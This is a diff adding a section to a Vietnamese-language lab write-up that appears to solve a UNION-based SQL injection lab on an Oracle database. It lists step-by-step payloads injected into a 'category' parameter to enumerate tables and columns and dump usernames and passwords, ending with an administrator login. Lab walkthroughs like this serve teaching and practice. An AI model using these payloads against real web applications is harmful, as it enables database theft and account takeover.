@@ -528,3 +528,29 @@ Solved the lab!
 Chọn một danh mục sản phẩm bất kỳ để lọc sản phẩm:
 
 ![img](214)
+
+Kiểm tra request:
+
+![img](215)
+
+Thử chèn SQLi payload `'+UNION+SELECT+'abc','def'+FROM+dual--` vào tham số `category`:
+
+![img](216)
+
+=> Thành công phát hiện có 2 cột chứa kiểu dữ liệu text. Tiếp theo, thử chèn `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` để response trả về danh sách tables trong CSDL:
+
+![img](217)
+
+=> Thành công trả về danh sách tables trong CSDL. Tìm được tên table chứa thông tin về user là `USERS_OLGCBU`. Tiếp theo, chèn payload để lấy về thông tin về các columns trong table: `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OLGCBU'--`:
+
+![img](218)
+
+=> Thông tin 3 cột được trả về: `EMAIL`, `PASSWORD_VFVHCO` và `USERNAME_DTQOVR`. Tiếp theo, chèn payload để xem giá trị của các cột này: `'+UNION+SELECT+USERNAME_DTQOVR,+PASSWORD_VFVHCO+FROM+USERS_OLGCBU--`:
+
+![img](219)
+
+=> Tìm ra thông tin đăng nhập của admin: `administrator:jw0crgfycdo7ndw1tptx`. Login và solve the lab:
+
+![img](220)
+
+
